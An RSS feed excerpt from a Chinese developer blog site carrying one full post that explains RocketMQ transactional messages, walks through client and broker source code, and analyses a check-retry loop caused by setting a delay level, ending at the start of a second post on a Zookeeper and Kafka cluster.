<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>RocketMQ事务消息学习及刨坑过程 - 清茶豆奶</title>
<link>http://www.cnblogs.com/huangying2124/p/11702761.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/huangying2124/p/11702761.html</guid>
<description>&lt;h3 id=&quot;一背景&quot;&gt;一、背景&lt;/h3&gt;
&lt;p&gt;MQ组件是系统架构里必不可少的一门利器，设计层面可以降低系统耦合度，高并发场景又可以起到削峰填谷的作用，从单体应用到集群部署方案，再到现在的微服务架构，MQ凭借其优秀的性能和高可靠性，得到了广泛的认可。&lt;br/&gt;随着数据量增多，系统压力变大，开始出现这种现象：数据库已经更新了，但消息没发出来，或者消息先发了，但后来数据库更新失败了，结果研发童鞋各种数据修复，这种生产问题出现的概率不大，但让人很郁闷。这个其实就是数据库事务与MQ消息的一致性问题，简单来讲，数据库的事务跟普通MQ消息发送无法直接绑定与数据库事务绑定在一起，例如上面提及的两种问题场景：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;数据库事务提交后发送MQ消息；&lt;/li&gt;
&lt;li&gt;MQ消息先发，然后再提交数据库事务。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;场景1的问题是数据库事务可能刚刚提交，服务器就宕机了，MQ消息没发出去，场景2的问题就是MQ消息发送出去了，但数据库事务提交失败，又没办法追加已经发出去的MQ消息，结果导致数据没更新，下游已经收到消息，最终事务出现不一致的情况。&lt;/p&gt;
&lt;h3 id=&quot;二事务消息的引出&quot;&gt;二、事务消息的引出&lt;/h3&gt;
&lt;p&gt;我们以微服务架构的购物场景为例，参照一下RocketMQ官方的例子，用户A发起订单，支付100块钱操作完成后，能得到100积分，账户服务和会员服务是两个独立的微服务模块，有各自的数据库，按照上文提及的问题可能性，将会出现这些情况：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;如果先扣款，再发消息，可能钱刚扣完，宕机了，消息没发出去，结果积分没增加。&lt;/li&gt;
&lt;li&gt;如果先发消息，再扣款，可能积分增加了，但钱没扣掉，白送了100积分给人家。&lt;/li&gt;
&lt;li&gt;钱正常扣了，消息也发送成功了，但会员服务实例消费消息出现问题，结果积分没增加。&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1834889/201910/1834889-20191019084521916-111869438.png&quot; alt=&quot;购物场景MQ通信案例&quot;/&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;由此引出的是数据库事务与MQ消息的事务一致性问题，rocketmq事务消息解决的问题：解决本地事务执行与消息发送的原子性问题。这里界限一定要明白，是确保MQ生产端正确无误地将消息发送出来，没有多发，也不会漏发。但至于发送后消费端有没有正常的消费掉（如上面提及的第三种情况，钱正常扣了，消息也发了，但下游消费出问题导致积分不对），这种异常场景将由MQ消息消费失败重试机制来保证，不在此次的讨论范围内。&lt;/p&gt;
&lt;p&gt;常用的MQ组件针对此场景都有自己的实现方案，如ActiveMQ使用AMQP协议(二阶提交方式)保证消息正确发送，这里我们以RocketMQ为重点进行学习。&lt;/p&gt;
&lt;h3 id=&quot;三rocketmq事务消息设计思路&quot;&gt;三、RocketMQ事务消息设计思路&lt;/h3&gt;
&lt;p&gt;根据CAP理论，RocketMQ事务消息通过异步确保方式，保证事务的最终一致性。设计流程上借鉴两阶段提交理论，流程图如下：&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1834889/201910/1834889-20191019084524981-1962615399.png&quot; alt=&quot;RocetMQ事务消息设计图&quot;/&gt;&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;应用模块遇到要发送事务消息的场景时，先发送prepare消息给MQ。&lt;/li&gt;
&lt;li&gt;prepare消息发送成功后，应用模块执行数据库事务（本地事务）。&lt;/li&gt;
&lt;li&gt;根据数据库事务执行的结果，再返回Commit或Rollback给MQ。&lt;/li&gt;
&lt;li&gt;如果是Commit，MQ把消息下发给Consumer端，如果是Rollback，直接删掉prepare消息。&lt;/li&gt;
&lt;li&gt;第3步的执行结果如果没响应，或是超时的，启动定时任务回查事务状态（最多重试15次，超过了默认丢弃此消息），处理结果同第4步。&lt;/li&gt;
&lt;li&gt;MQ消费的成功机制由MQ自己保证。&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;四rocketmq事务消息实现流程&quot;&gt;四、RocketMQ事务消息实现流程&lt;/h3&gt;
&lt;p&gt;以RocketMQ 4.5.2版本为例，事务消息有专门的一个队列RMQ_SYS_TRANS_HALF_TOPIC，所有的prepare消息都先往这里放，当消息收到Commit请求后，就把消息再塞到真实的Topic队列里，供Consumer消费，同时向RMQ_SYS_TRANS_OP_HALF_TOPIC塞一条消息。简易流程图如下：&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1834889/201910/1834889-20191019084525350-1503231121.png&quot; alt=&quot;RocketMQ事务消息实现流程&quot;/&gt;&lt;/p&gt;
&lt;p&gt;上述流程中，请允许我这样划分模块职责：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;RocketMQ Client即我们工程中导入的依赖jar包，RocketMQ Broker端即部署的服务端，NameServer暂未体现。&lt;/li&gt;
&lt;li&gt;应用模块成对出现，上游为事务消息生产端，下游为事务消息消费端（事务消息对消费端是透明的，与普通消息一致）。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;应用模块的事务因为中断，或是其他的网络原因，导致无法立即响应的，RocketMQ当做UNKNOW处理，RocketMQ事务消息还提供了一个补救方案：定时查询事务消息的数据库事务状态&lt;br/&gt;简易流程图如下：&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1834889/201910/1834889-20191019084525802-190069875.png&quot; alt=&quot;RocketMQ定时任务回查事务状态实现流程&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;五源码剖析&quot;&gt;五、源码剖析&lt;/h3&gt;
&lt;p&gt;讲解的思路基本上按照如下流程图，根据模块职责和流程逐一分析。&lt;/p&gt;
&lt;ol readability=&quot;-1.5&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;环境准备&lt;br/&gt;阅读源码前需要在IDE上获取和调试RocketMQ的源码，这部分请自行查阅方法。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;应用模块（事务消息生产端）核心源码&lt;br/&gt;创建一个监听类，实现TransactionListener接口，在实现的数据库事务提交方法和回查事务状态方法模拟结果。&lt;/li&gt;
&lt;/ol&gt;&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;/**
 * @program: rocket
 * @description: 调试事务消息示例代码
 * @author: Huang
 * @create: 2019-10-16
 **/
public class SelfTransactionListener implements TransactionListener {
   private AtomicInteger transactionIndex = new AtomicInteger(0);
   private AtomicInteger checkTimes = new AtomicInteger(0);

   private ConcurrentHashMap&amp;lt;String, Integer&amp;gt; localTrans = new ConcurrentHashMap&amp;lt;&amp;gt;();
   /**
    * 执行本地事务
    *
    * @param message
    * @param o
    * @return
    */
   @Override
   public LocalTransactionState executeLocalTransaction(Message message, Object o) {
      String msgKey = message.getKeys();
      System.out.println(&quot;start execute local transaction &quot; + msgKey);
      LocalTransactionState state;
      if (msgKey.contains(&quot;1&quot;)) {
         // 第一条消息让他通过
         state = LocalTransactionState.COMMIT_MESSAGE;
      } else if (msgKey.contains(&quot;2&quot;)) {
         // 第二条消息模拟异常，明确回复回滚操作
         state = LocalTransactionState.ROLLBACK_MESSAGE;
      } else {
         // 第三条消息无响应，让它调用回查事务方法
         state = LocalTransactionState.UNKNOW;
         // 给剩下3条消息，放1，2，3三种状态
         localTrans.put(msgKey, transactionIndex.incrementAndGet());
      }
      System.out.println(&quot;executeLocalTransaction:&quot; + message.getKeys() + &quot;,execute state:&quot; + state + &quot;,current time：&quot; + System.currentTimeMillis());
      return state;
   }

   /**
    * 回查本地事务结果
    *
    * @param messageExt
    * @return
    */
   @Override
   public LocalTransactionState checkLocalTransaction(MessageExt messageExt) {
      String msgKey = messageExt.getKeys();
      System.out.println(&quot;start check local transaction &quot; + msgKey);
      Integer state = localTrans.get(msgKey);
      switch (state) {
         case 1:
            System.out.println(&quot;check result unknown 回查次数&quot; + checkTimes.incrementAndGet());
            return LocalTransactionState.UNKNOW;
         case 2:
            System.out.println(&quot;check result commit message, 回查次数&quot; + checkTimes.incrementAndGet());
            return LocalTransactionState.COMMIT_MESSAGE;
         case 3:
            System.out.println(&quot;check result rollback message, 回查次数&quot; + checkTimes.incrementAndGet());
            return LocalTransactionState.ROLLBACK_MESSAGE;

         default:
            return LocalTransactionState.COMMIT_MESSAGE;
      }
   }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;事务消息生产者代码示例，共发送5条消息，基本上包含全部的场景，休眠时间设置足够的时间，保证回查事务时实例还在运行中，代码如下：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;/**
 * @program: rocket
 * @description: Rocketmq事务消息
 * @author: Huang
 * @create: 2019-10-16
 **/
public class TransactionProducer {

   public static void main(String[] args) {
      try {
         TransactionMQProducer producer = new TransactionMQProducer(&quot;transactionMQProducer&quot;);
         producer.setNamesrvAddr(&quot;10.0.133.29:9876&quot;);
         producer.setTransactionListener(new SelfTransactionListener());
         producer.start();
         for (int i = 1; i &amp;lt; 6; i++) {
            Message message = new Message(&quot;TransactionTopic&quot;, &quot;transactionTest&quot;,&quot;msg-&quot; + i, (&quot;Hello&quot; + &quot;:&quot; +  i).getBytes());
            try {
               SendResult result = producer.sendMessageInTransaction(message, &quot;Hello&quot; + &quot;:&quot; +  i);
               System.out.printf(&quot;Topic:%s send success, misId is:%s%n&quot;, message.getTopic(), result.getMsgId());
            } catch (Exception e) {
               e.printStackTrace();
            }
         }
         Thread.sleep(Integer.MAX_VALUE);
         producer.shutdown();
      } catch (MQClientException e) {
         e.printStackTrace();
      } catch (InterruptedException e) {
         e.printStackTrace();
      }
   }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;ol&gt;&lt;li&gt;RocketMQ Client端代码，代码主要逻辑可以分成三段：第一段为设置消息为prepare消息，并发送给RocketMQ服务端&lt;/li&gt;
&lt;/ol&gt;&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;SendResult sendResult = null;
MessageAccessor.putProperty(msg, MessageConst.PROPERTY_TRANSACTION_PREPARED, &quot;true&quot;);
MessageAccessor.putProperty(msg, MessageConst.PROPERTY_PRODUCER_GROUP, this.defaultMQProducer.getProducerGroup());
try {
    sendResult = this.send(msg);
} catch (Exception e) {
    throw new MQClientException(&quot;send message Exception&quot;, e);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;第二段：消息发送成功后，调用应用模块数据库事务方法，获取事务结果（为节省篇幅，代码有删节）&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;switch (sendResult.getSendStatus()) {
    case SEND_OK: {
        try {
            if (null != localTransactionExecuter) {
                localTransactionState = localTransactionExecuter.executeLocalTransactionBranch(msg, arg);
            } else if (transactionListener != null) {
                log.debug(&quot;Used new transaction API&quot;);
                localTransactionState = transactionListener.executeLocalTransaction(msg, arg);
            }
            if (null == localTransactionState) {
                localTransactionState = LocalTransactionState.UNKNOW;
            }
        } catch (Throwable e) {
            log.info(&quot;executeLocalTransactionBranch exception&quot;, e);
            log.info(msg.toString());
            localException = e;
        }
    }
    break;
    case FLUSH_DISK_TIMEOUT:
    case FLUSH_SLAVE_TIMEOUT:
    case SLAVE_NOT_AVAILABLE:
        localTransactionState = LocalTransactionState.ROLLBACK_MESSAGE;
        break;
    default:
        break;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;第三段：发送事务结果到RocketMQ端，结束事务，并响应结果给应用模块&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;try {
    this.endTransaction(sendResult, localTransactionState, localException);
} catch (Exception e) {
    log.warn(&quot;local transaction execute &quot; + localTransactionState + &quot;, but end broker transaction failed&quot;, e);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;ol&gt;&lt;li&gt;RocketMQ Broker端事务提交/回滚操作（这里取endTransaction部分）&lt;br/&gt;代码入口：org.apache.rocketmq.broker.processor.EndTransactionProcessor&lt;/li&gt;
&lt;/ol&gt;&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;OperationResult result = new OperationResult();
if (MessageSysFlag.TRANSACTION_COMMIT_TYPE == requestHeader.getCommitOrRollback()) {
    result = this.brokerController.getTransactionalMessageService().commitMessage(requestHeader);
    if (result.getResponseCode() == ResponseCode.SUCCESS) {
        RemotingCommand res = checkPrepareMessage(result.getPrepareMessage(), requestHeader);
        if (res.getCode() == ResponseCode.SUCCESS) {
            // 修改消息的Topic为由RMQ_SYS_TRANS_HALF_TOPIC改为真实Topic
            MessageExtBrokerInner msgInner = endMessageTransaction(result.getPrepareMessage());
            msgInner.setSysFlag(MessageSysFlag.resetTransactionValue(msgInner.getSysFlag(), requestHeader.getCommitOrRollback()));
            msgInner.setQueueOffset(requestHeader.getTranStateTableOffset());
            msgInner.setPreparedTransactionOffset(requestHeader.getCommitLogOffset());
            msgInner.setStoreTimestamp(result.getPrepareMessage().getStoreTimestamp());
            // 将消息存储到真实Topic中，供Consumer消费
            RemotingCommand sendResult = sendFinalMessage(msgInner);
            if (sendResult.getCode() == ResponseCode.SUCCESS) {
                // 将消息存储到RMQ_SYS_TRANS_OP_HALF_TOPIC，标记为删除状态，事务消息回查的定时任务中会做处理
                this.brokerController.getTransactionalMessageService().deletePrepareMessage(result.getPrepareMessage());
            }
            return sendResult;
        }
        return res;
    }
} else if (MessageSysFlag.TRANSACTION_ROLLBACK_TYPE == requestHeader.getCommitOrRollback()) {
    result = this.brokerController.getTransactionalMessageService().rollbackMessage(requestHeader);
    if (result.getResponseCode() == ResponseCode.SUCCESS) {
        RemotingCommand res = checkPrepareMessage(result.getPrepareMessage(), requestHeader);
        if (res.getCode() == ResponseCode.SUCCESS) {
            this.brokerController.getTransactionalMessageService().deletePrepareMessage(result.getPrepareMessage());
        }
        return res;
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;ol&gt;&lt;li&gt;RocketMQ Broker端定时任务回查数据库事务部分&lt;br/&gt;方法入口：org.apache.rocketmq.broker.transaction.TransactionalMessageCheckService&lt;/li&gt;
&lt;/ol&gt;&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;@Override
protected void onWaitEnd() {
    long timeout = brokerController.getBrokerConfig().getTransactionTimeOut();
    // 超过15次的回查事务状态失败后，默认是丢弃此消息
    int checkMax = brokerController.getBrokerConfig().getTransactionCheckMax();
    long begin = System.currentTimeMillis();
    log.info(&quot;Begin to check prepare message, begin time:{}&quot;, begin);
    this.brokerController.getTransactionalMessageService().check(timeout, checkMax, this.brokerController.getTransactionalMessageCheckListener());
    log.info(&quot;End to check prepare message, consumed time:{}&quot;, System.currentTimeMillis() - begin);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;回查事务调用入口：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// 此段代码为TransactionalMessageServiceImpl类中的check方法
List&amp;lt;MessageExt&amp;gt; opMsg = pullResult.getMsgFoundList();
boolean isNeedCheck = (opMsg == null &amp;amp;&amp;amp; valueOfCurrentMinusBorn &amp;gt; checkImmunityTime)
    || (opMsg != null &amp;amp;&amp;amp; (opMsg.get(opMsg.size() - 1).getBornTimestamp() - startTime &amp;gt; transactionTimeout))
    || (valueOfCurrentMinusBorn &amp;lt;= -1
);

if (isNeedCheck) {
    if (!putBackHalfMsgQueue(msgExt, i)) {
        continue;
    }
    // 调用AbstractTransactionalMessageCheckListener的
    listener.resolveHalfMsg(msgExt);
} else {
    pullResult = fillOpRemoveMap(removeMap, opQueue, pullResult.getNextBeginOffset(), halfOffset, doneOpOffset);
    log.info(&quot;The miss offset:{} in messageQueue:{} need to get more opMsg, result is:{}&quot;, i,
        messageQueue, pullResult);
    continue;
}

// 此方法在AbstractTransactionalMessageCheckListener类中
public void resolveHalfMsg(final MessageExt msgExt) {
    executorService.execute(new Runnable() {
        @Override
        public void run() {
            try {
                sendCheckMessage(msgExt);
            } catch (Exception e) {
                LOGGER.error(&quot;Send check message error!&quot;, e);
            }
        }
    });
}

// 此方法在AbstractTransactionalMessageCheckListener类中
public void sendCheckMessage(MessageExt msgExt) throws Exception {
    CheckTransactionStateRequestHeader checkTransactionStateRequestHeader = new CheckTransactionStateRequestHeader();
    checkTransactionStateRequestHeader.setCommitLogOffset(msgExt.getCommitLogOffset());
    checkTransactionStateRequestHeader.setOffsetMsgId(msgExt.getMsgId());
    checkTransactionStateRequestHeader.setMsgId(msgExt.getUserProperty(MessageConst.PROPERTY_UNIQ_CLIENT_MESSAGE_ID_KEYIDX));
    checkTransactionStateRequestHeader.setTransactionId(checkTransactionStateRequestHeader.getMsgId());
    checkTransactionStateRequestHeader.setTranStateTableOffset(msgExt.getQueueOffset());
    msgExt.setTopic(msgExt.getUserProperty(MessageConst.PROPERTY_REAL_TOPIC));
    msgExt.setQueueId(Integer.parseInt(msgExt.getUserProperty(MessageConst.PROPERTY_REAL_QUEUE_ID)));
    msgExt.setStoreSize(0);
    String groupId = msgExt.getProperty(MessageConst.PROPERTY_PRODUCER_GROUP);
    Channel channel = brokerController.getProducerManager().getAvaliableChannel(groupId);
    if (channel != null) {
        // 通过Netty发送请求到RocketMQ Client端，执行checkTransactionState方法
        brokerController.getBroker2Client().checkProducerTransactionState(groupId, channel, checkTransactionStateRequestHeader, msgExt);
    } else {
        LOGGER.warn(&quot;Check transaction failed, channel is null. groupId={}&quot;, groupId);
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;RocketMQ Client接收到服务端的请求后，重新调用回查数据库事务方法，并将事务结果再次提交到RocketMQ Broker端&lt;br/&gt;方法入口：org.apache.rocketmq.client.impl.producer.DefaultMQProducerImpl类的方法&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;try {
    if (transactionCheckListener != null) {
        localTransactionState = transactionCheckListener.checkLocalTransactionState(message);
    } else if (transactionListener != null) {
        log.debug(&quot;Used new check API in transaction message&quot;);
        localTransactionState = transactionListener.checkLocalTransaction(message);
    } else {
        log.warn(&quot;CheckTransactionState, pick transactionListener by group[{}] failed&quot;, group);
    }
} catch (Throwable e) {
    log.error(&quot;Broker call checkTransactionState, but checkLocalTransactionState exception&quot;, e);
    exception = e;
}

this.processTransactionState(
    localTransactionState,
    group,
    exception);&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;六补充一个问题&quot;&gt;六、补充一个问题&lt;/h3&gt;
&lt;p&gt;官网有提及，事务消息是不支持延迟消息和批量消息，我手贱试了一下延迟消息，事务消息设置一个DelayTimeLevel，结果这条消息就一直无法从RMQ_SYS_TRANS_HALF_TOPIC移除掉了，应用模块的日志发现在反复地尝试回查事务，Console界面上RMQ_SYS_TRANS_HALF_TOPIC的消息查询列表很快就超过2000条记录了，为什么？&lt;/p&gt;
&lt;p&gt;我们回到代码层面进行分析，过程如下：&lt;/p&gt;
&lt;p&gt;1.设置了DelayTimeLevel后，数据事务提交后（或是回查数据库事务完成后），将消息写入目标Topic时，由于DelayTimeLevel的干扰，目标Topic将变成SCHEDULE_TOPIC_XXXX，同时REAL_TOPIC变成RMQ_SYS_TRANS_HALF_TOPIC，真实的Topic在这个环节已经丢失。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// RocketMQ Broker端接受事务提交后的处理
org.apache.rocketmq.broker.processor.EndTransactionProcessor类
OperationResult result = new OperationResult();
if (MessageSysFlag.TRANSACTION_COMMIT_TYPE == requestHeader.getCommitOrRollback()) {
    // 这里调用CommitLog的putMessage方法
    result = this.brokerController.getTransactionalMessageService().commitMessage(requestHeader);
    if (result.getResponseCode() == ResponseCode.SUCCESS) {
        RemotingCommand res = checkPrepareMessage(result.getPrepareMessage(), requestHeader);
        if (res.getCode() == ResponseCode.SUCCESS) {
            // 修改消息的Topic为由RMQ_SYS_TRANS_HALF_TOPIC改为真实Topic
            MessageExtBrokerInner msgInner = endMessageTransaction(result.getPrepareMessage());
            msgInner.setSysFlag(MessageSysFlag.resetTransactionValue(msgInner.getSysFlag(), requestHeader.getCommitOrRollback()));
            msgInner.setQueueOffset(requestHeader.getTranStateTableOffset());
            msgInner.setPreparedTransactionOffset(requestHeader.getCommitLogOffset());
            msgInner.setStoreTimestamp(result.getPrepareMessage().getStoreTimestamp());
            // 将消息存储到真实Topic中，此时Topic已经变成SCHEDULE_TOPIC_XXXX
            RemotingCommand sendResult = sendFinalMessage(msgInner);
            if (sendResult.getCode() == ResponseCode.SUCCESS) {
                // 将消息存储到RMQ_SYS_TRANS_OP_HALF_TOPIC，标记为删除状态，事务消息回查的定时任务中会做处理
                this.brokerController.getTransactionalMessageService().deletePrepareMessage(result.getPrepareMessage());
            }
            return sendResult;
        }
        return res;
    }
}

// 此段代码在org.apache.rocketmq.store.CommitLog类的putMessage方法中
// 由于DelayTimeLevel的干扰，目标Topic将变成SCHEDULE_TOPIC_XXXX
final int tranType = MessageSysFlag.getTransactionValue(msg.getSysFlag());
if (tranType == MessageSysFlag.TRANSACTION_NOT_TYPE
    || tranType == MessageSysFlag.TRANSACTION_COMMIT_TYPE) {
    // Delay Delivery
    if (msg.getDelayTimeLevel() &amp;gt; 0) {
        if (msg.getDelayTimeLevel() &amp;gt; this.defaultMessageStore.getScheduleMessageService().getMaxDelayLevel()) {
            msg.setDelayTimeLevel(this.defaultMessageStore.getScheduleMessageService().getMaxDelayLevel());
        }

        topic = ScheduleMessageService.SCHEDULE_TOPIC;
        queueId = ScheduleMessageService.delayLevel2QueueId(msg.getDelayTimeLevel());

        // Backup real topic, queueId
        MessageAccessor.putProperty(msg, MessageConst.PROPERTY_REAL_TOPIC, msg.getTopic());
        MessageAccessor.putProperty(msg, MessageConst.PROPERTY_REAL_QUEUE_ID, String.valueOf(msg.getQueueId()));
        msg.setPropertiesString(MessageDecoder.messageProperties2String(msg.getProperties()));

        msg.setTopic(topic);
        msg.setQueueId(queueId);
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;打印的日志示例如下：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;2019-10-17 14\:41\:05 INFO EndTransactionThread_4 - Transaction op message write successfully. messageId=0A00851D00002A9F0000000000000E09, queueId=0 
msgExt:MessageExt [queueId=0, storeSize=335, queueOffset=5, sysFlag=8, bornTimestamp=1571293959305, bornHost=/10.0.133.29:54634, storeTimestamp=1571294460555, 
storeHost=/10.0.133.29:10911, msgId=0A00851D00002A9F0000000000000E09, commitLogOffset=3593, bodyCRC=1849408413, reconsumeTimes=0, preparedTransactionOffset=0, 
toString()=Message{topic='SCHEDULE_TOPIC_XXXX', flag=0, properties={REAL_TOPIC=RMQ_SYS_TRANS_HALF_TOPIC, TRANSACTION_CHECK_TIMES=3, KEYS=msg-test-3, 
TRAN_MSG=true, UNIQ_KEY=0A00851D422C18B4AAC25584B0880000, WAIT=false, DELAY=1, PGROUP=transactionMQProducer, TAGS=transactionTest, REAL_QID=0}, 
body=[72, 101, 108, 108, 111, 84, 105, 109, 101, 58, 51], transactionId='null'}]&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;2.延迟消息是定时任务触发的，我刚刚设置的延迟是1秒，定时任务又把消息重新放回RMQ_SYS_TRANS_HALF_TOPIC中，注意此时只有RMQ_SYS_TRANS_HALF_TOPIC有消息，RMQ_SYS_TRANS_OP_HALF_TOPIC队列是没有这条消息的，如下代码：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// 此段代码在org.apache.rocketmq.store.schedule.ScheduleMessageService类executeOnTimeup方法内
try {
    // 消息重新回到RMQ_SYS_TRANS_HALF_TOPIC队列中
    MessageExtBrokerInner msgInner = this.messageTimeup(msgExt);
    PutMessageResult putMessageResult =
        ScheduleMessageService.this.writeMessageStore
            .putMessage(msgInner);

    if (putMessageResult != null
        &amp;amp;&amp;amp; putMessageResult.getPutMessageStatus() == PutMessageStatus.PUT_OK) {
        continue;
    } else {
        log.error(
            &quot;ScheduleMessageService, a message time up, but reput it failed, topic: {} msgId {}&quot;,
            msgExt.getTopic(), msgExt.getMsgId());
        ScheduleMessageService.this.timer.schedule(
            new DeliverDelayedMessageTimerTask(this.delayLevel,
                nextOffset), DELAY_FOR_A_PERIOD);
        ScheduleMessageService.this.updateOffset(this.delayLevel,
            nextOffset);
        return;
    }
} catch (Exception e) {
    log.error(
        &quot;ScheduleMessageService, messageTimeup execute error, drop it. msgExt=&quot;
            + msgExt + &quot;, nextOffset=&quot; + nextOffset + &quot;,offsetPy=&quot;
            + offsetPy + &quot;,sizePy=&quot; + sizePy, e);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;3.事务消息定时任务启动，查RMQ_SYS_TRANS_HALF_TOPIC有消息，但RMQ_SYS_TRANS_OP_HALF_TOPIC没有消息，为了保证消息顺序写入，又将此消息重新填入RMQ_SYS_TRANS_OP_HALF_TOPIC中，并且触发一次回查事务操作。示例代码如上文回查事务调用入口相同：&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// 此段代码为TransactionalMessageServiceImpl类中的check方法
List&amp;lt;MessageExt&amp;gt; opMsg = pullResult.getMsgFoundList();
boolean isNeedCheck = (opMsg == null &amp;amp;&amp;amp; valueOfCurrentMinusBorn &amp;gt; checkImmunityTime)
    || (opMsg != null &amp;amp;&amp;amp; (opMsg.get(opMsg.size() - 1).getBornTimestamp() - startTime &amp;gt; transactionTimeout))
    || (valueOfCurrentMinusBorn &amp;lt;= -1
);

if (isNeedCheck) {
    if (!putBackHalfMsgQueue(msgExt, i)) {
        continue;
    }
    listener.resolveHalfMsg(msgExt);
} else {
    pullResult = fillOpRemoveMap(removeMap, opQueue, pullResult.getNextBeginOffset(), halfOffset, doneOpOffset);
    log.info(&quot;The miss offset:{} in messageQueue:{} need to get more opMsg, result is:{}&quot;, i,
        messageQueue, pullResult);
    continue;
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这样构成了一个死循环，直到尝试到15次才丢弃此消息（默认最大尝试次数是15次），这个代价有点大。针对此问题的优化，已经提交PR到RocketMQ社区，新版本发布后，事务消息将屏蔽DelayTimeLevel，这个问题就不会再出现了。&lt;/p&gt;
&lt;p&gt;在新版本发布之前，我们的解决办法：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;明确研发过程中事务消息禁止设置DelayTimeLevel。&lt;br/&gt;感觉有风险，毕竟新来的童鞋，不是特别了解此部分功能的可能会手抖加上（像我最早那样）。&lt;/li&gt;
&lt;li&gt;对RocketMQ Client做一次简单的封装，比如提供一个rocketmq-spring-boot-starter，在提供发送事务消息的方法里不提供设置的入口，如下示例：&lt;/li&gt;
&lt;/ol&gt;&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;/**
 * 事务消息发送
 * 不支持延迟发送和批量发送
 */
public void sendMessageInTransaction(String topic, String tag, Object message, String requestId) throws Exception {
   TransactionMQProducer producer = annotationScan.getProducer(topic + &quot;_&quot; + tag);
   producer.sendMessageInTransaction(MessageBuilder.of(topic, tag, message, requestId).build(), message);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;应该靠谱一些，毕竟从源头杜绝了DelayTimeLevel参数的设置。&lt;/p&gt;
&lt;h3 id=&quot;七结束语&quot;&gt;七、结束语&lt;/h3&gt;
&lt;p&gt;本篇简单介绍了事务消息的解决的场景和职责的界限，基本的设计思路和流程，在此借鉴学习了RocketMQ作者的图稿，然后挑了部分代码作简要的讲解，还是自己的刨坑过程，文章内有任何不正确或不详尽之处请留言指导，谢谢。&lt;/p&gt;
&lt;p&gt;专注Java高并发、分布式架构，更多技术干货分享与心得，请关注公众号：Java架构社区&lt;br/&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1834889/201910/1834889-20191019084526385-2005239440.jpg&quot; alt=&quot;Java架构社区&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Sat, 19 Oct 2019 00:45:00 +0000</pubDate>
<dc:creator>清茶豆奶</dc:creator>
<og:description>RocketMQ事务消息学习及刨坑过程</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/huangying2124/p/11702761.html</dc:identifier>
</item>
<item>
<title>zookeeper+KAFKA 集群搭建 - 快乐的人啊</title>
<link>http://www.cnblogs.com/liushuqing/p/11702760.html</link>
